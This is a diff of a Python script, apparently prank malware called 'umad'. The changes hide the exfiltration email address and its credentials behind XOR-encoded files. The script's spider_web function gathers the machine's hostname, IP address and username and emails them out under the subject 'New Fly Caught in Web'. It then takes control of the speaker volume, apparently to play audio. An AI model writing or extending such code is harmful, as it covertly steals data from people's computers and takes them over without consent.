@@ -8,7 +8,8 @@ import winsound
 import socket
 import smtplib 
 
-xor_key = "6yH2jU9kR8nQ"
+with open("umad/cipher.txt","r") as file:
+    xor_key = file.read().strip()
 
 def run():
     for x in range(5):
@@ -18,14 +19,18 @@ def xor_cipher(text, key):
     return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
 
 def spider_web():
+    with open("umad/email.txt", "r") as file:
+        email = file.read().strip()
+        email_name = xor_cipher(email, xor_key)
+        file.close()
+    with open("umad/key.txt", "r") as key:
+        passw = key.read().strip()
+        deobfuscated_key = xor_cipher(passw, xor_key)
+        key.close()    
+
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
     user = os.getlogin()
-    email_name = "emailtrap71@gmail.com"
-    with open("E:/umad/key.txt", "r") as key:
-        passw = key.read().strip()
-        deobfuscated_key = xor_cipher(passw, xor_key)
-        key.close()
     subject = "New Fly Caught in Web"
     body = f"Fly Caught Hostname: {hostname} Ip: {ip} Username: {user}"
     email_message = f"Subject: {subject}\n\n{body}"
@@ -35,16 +40,17 @@ def spider_web():
         server.sendmail(email_name,email_name,email_message)
         server.quit()
     except Exception as e:
-        print(f"Erro: {e}")
+        print(f"Error: {e}")
 spider_web()
 
-folder_path = "E:/umad/Audio"
+folder_path = "/umad/Audio"
 filenames_1 = os.listdir(folder_path)
 filenames = []
 
+
 for file_name in filenames_1:
     filenames.append(file_name.split(".")[0])
-    
+
 devices = AudioUtilities.GetSpeakers()
 interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
 volume = cast(interface, POINTER(IAudioEndpointVolume))
